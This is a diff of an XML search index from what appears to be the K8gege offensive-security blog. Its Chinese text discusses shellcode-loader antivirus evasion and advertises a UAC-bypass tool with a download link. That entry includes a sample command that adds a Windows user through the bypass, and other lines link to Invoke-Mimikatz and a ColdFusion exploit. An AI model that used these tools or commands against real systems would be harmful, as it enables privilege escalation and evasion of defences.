+<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
+<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
+<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
+<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
+<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
+<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
+<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
+<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
+<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
+<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
+<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
+<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
+<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
+<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
       <categories>
-        <category>提权</category>
-        <category>Exp</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Exp</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>免杀</category>
+        <category>Cobalt Strike</category>
+        <category>Metasploit</category>
+        <category>ShellCode</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>Exp</tag>
-        <tag>BypassUAC</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
+        <tag>BypassAV</tag>
       </tags>
   </entry>
   <entry>
@@ -4530,8 +4530,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>PowerShell</p>
 <p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
         <category>密码</category>
         <category>PowerShell</category>
       </categories>
@@ -4580,8 +4580,8 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
 <p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
 <p>&nbsp;</p>]]></content>
       <categories>
-        <category>Exp</category>
         <category>工具</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -4607,13 +4607,13 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
 <p>&nbsp;</p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>LPE</tag>
         <tag>Exp</tag>
+        <tag>LPE</tag>
         <tag>IIS</tag>
       </tags>
   </entry>
@@ -4682,11 +4682,11 @@ from pprint import pprint
         <category>工具</category>
         <category>主机发现</category>
         <category>源码</category>
-        <category>嗅探</category>
         <category>内网渗透</category>
         <category>信息收集</category>
-        <category>编程</category>
         <category>Python</category>
+        <category>编程</category>
+        <category>嗅探</category>
       </categories>
       <tags>
         <tag>Tool</tag>
